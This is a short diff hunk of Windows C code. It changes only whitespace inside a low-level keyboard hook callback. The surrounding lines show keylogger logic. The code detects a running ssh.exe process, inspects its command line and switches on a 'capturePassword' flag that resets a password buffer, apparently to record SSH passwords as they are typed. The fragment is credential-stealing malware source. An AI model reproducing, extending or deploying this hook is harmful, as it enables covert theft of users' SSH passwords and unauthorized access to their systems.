@@ -318,20 +318,20 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
         PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
         int vkCode = kbdStruct->vkCode;
         BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
-        
+
         if (wParam == WM_KEYDOWN) {
             DWORD checkPid = IsProcessRunning(L"ssh.exe");
             if (checkPid != lastPID) {
                 contains_i = GetCommandLineByPID(checkPid);
                 printf("contains_i = %d\n", contains_i);
                 lastPID = checkPid;
-                if (contains_i == 0) { 
-                    capturePassword = TRUE; 
+                if (contains_i == 0) {
+                    capturePassword = TRUE;
                 }
                 else {
                     capturePassword = FALSE;
                 }
-                
+
                 passwordBufferIndex = 0;
             }
 
